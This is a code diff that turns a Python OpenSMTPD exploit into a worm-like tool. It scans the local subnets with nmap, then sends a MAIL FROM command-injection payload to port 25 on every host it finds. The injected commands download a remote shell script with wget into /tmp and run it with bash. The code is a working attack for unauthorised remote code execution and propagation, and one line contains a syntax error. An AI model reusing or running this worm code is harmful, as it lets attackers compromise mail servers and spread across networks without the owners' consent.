@@ -18,7 +18,7 @@ def paired(iterable):
 
 def find_subnets():
 	ifconfig = subprocess.check_output(['ifconfig'], text = True)
-	# rn i want this example cinet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
+	# rn i want this example inet 172.19.0.1  netmask 255.255.0.0  broadcast 172.19.255.255
 	strs = ifconfig.split("\n ")
 	lst = []
 	for item in strs:
@@ -46,62 +46,76 @@ def find_subnets():
 		if 'inet ' in x:
 			i += x[6:] # to get 1.2.3.4
 			
-		if 'netmask' in y:
-			i += '/'
-			i += y[8:]
+		if 'netmask' in y: # only go for /24 - time pressures
+			i += '/24'
 		i = ipaddress.IPv4Interface(i)
 		i = i.with_prefixlen
 		targets.append(i)
-		
-	return targets
+	# step 1 - find suitable targets for nmap complete
+
+	nmap_res = []
+	c = 0
+	n = 0
+	for item in targets:
+		nmap_ret = subprocess.check_output(['nmap', item], text = True)
+		if not 'All 1000 scanned ports on' in nmap_ret:
+			strs = nmap_ret.split("\n")
+			for i in strs:
+				if 'Nmap scan report for' in i:
+					nmap_scan_report = i.split('(')1
+					for losing_my_shit in nmap_scan_report:
+						if not 'Nmap' in losing_my_shit:
+							nmap_res.append(losing_my_shit.translate({ord(x): None for x in ')'})) # da ip
+
+	return nmap_res # return the resolution of ips that are up
 	
-print(find_subnets())
+addy_list = find_subnets()
+print(addy_list)
+for ADDR in addy_list:
+	PORT = 25
+	print(ADDR + " " + str(PORT))
+	CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
 
-ADDR = sys.argv[1]
-PORT = int(sys.argv[2])
-print(ADDR + " " + str(PORT))
-CMD = ['wget -O /tmp/woot.sh raw.githubusercontent.com/presentdaypresenttime/shai_hulud/main/woot.sh', 'bash /tmp/woot.sh']
+	for cmdnum in range(len(CMD)):
+		print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
+		s = socket(AF_INET, SOCK_STREAM)
+		s.connect((ADDR, PORT))
+		res = s.recv(1024)
+		if 'OpenSMTPD' not in str(res):
+			print('[!] No OpenSMTPD detected')
+			print('[!] Received {}'.format(str(res)))
+			print('[!] Exiting...')
+			sys.exit(1)
 
-for cmdnum in range(len(CMD)):
-    print("Attempting "  + CMD[cmdnum] + ", " + str(cmdnum + 1) + "/ " + str(len(CMD)))
-    s = socket(AF_INET, SOCK_STREAM)
-    s.connect((ADDR, PORT))
-    res = s.recv(1024)
-    if 'OpenSMTPD' not in str(res):
-        print('[!] No OpenSMTPD detected')
-        print('[!] Received {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
+		print('[*] OpenSMTPD detected')
+		s.send(b'HELO x\r\n')
+		res = s.recv(1024)
+		if '250' not in str(res):
+			print('[!] Error connecting, expected 250')
+			print('[!] Received: {}'.format(str(res)))
+			print('[!] Exiting...')
+			sys.exit(1)
 
-    print('[*] OpenSMTPD detected')
-    s.send(b'HELO x\r\n')
-    res = s.recv(1024)
-    if '250' not in str(res):
-        print('[!] Error connecting, expected 250')
-        print('[!] Received: {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
+		print('[*] Connected, sending payload' + CMD[cmdnum])
+		s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
+		res = s.recv(1024)
+		if '250' not in str(res):
+			print('[!] Error sending payload, expected 250')
+			print('[!] Received: {}'.format(str(res)))
+			print('[!] Exiting...')
+			sys.exit(1)
 
-    print('[*] Connected, sending payload' + CMD[cmdnum])
-    s.send(bytes('MAIL FROM:<;{};>\r\n'.format(CMD[cmdnum]), 'utf-8'))
-    res = s.recv(1024)
-    if '250' not in str(res):
-        print('[!] Error sending payload, expected 250')
-        print('[!] Received: {}'.format(str(res)))
-        print('[!] Exiting...')
-        sys.exit(1)
-
-    print('[*] Payload sent')
-    s.send(b'RCPT TO:<root>\r\n')
-    s.recv(1024)
-    s.send(b'DATA\r\n')
-    s.recv(1024)
-    s.send(b'\r\nxxx\r\n.\r\n')
-    s.recv(1024)
-    s.send(b'QUIT\r\n')
-    s.recv(1024)
-    print('[*] Done')
-    time.sleep(3)
+		print('[*] Payload sent')
+		s.send(b'RCPT TO:<root>\r\n')
+		s.recv(1024)
+		s.send(b'DATA\r\n')
+		s.recv(1024)
+		s.send(b'\r\nxxx\r\n.\r\n')
+		s.recv(1024)
+		s.send(b'QUIT\r\n')
+		s.recv(1024)
+		print('[*] Done')
+		time.sleep(3)
 
 
 
